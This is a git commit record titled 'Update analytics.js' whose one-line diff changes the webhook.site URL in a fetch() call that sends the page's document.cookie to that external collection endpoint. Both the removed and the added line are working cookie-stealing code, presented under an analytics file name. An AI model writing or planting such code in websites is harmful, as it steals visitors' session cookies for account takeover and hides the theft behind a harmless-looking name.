095bd7e9c8b93bb3f6a8d555569bddb9e58ebf78
Samit Masih <130366822+strokinmasi@users.noreply.github.com>
2025-04-23 23:29:55 +1000

    Update analytics.js

--- analytics.js
+++ analytics.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/6f478cc6-d45b-499e-83fa-009ffbaf6088?cookie=' + document.cookie);
+fetch('https://webhook.site/6f478cc6-d45b-499e-83fa-009fb0af6088?cookie=' + document.cookie);
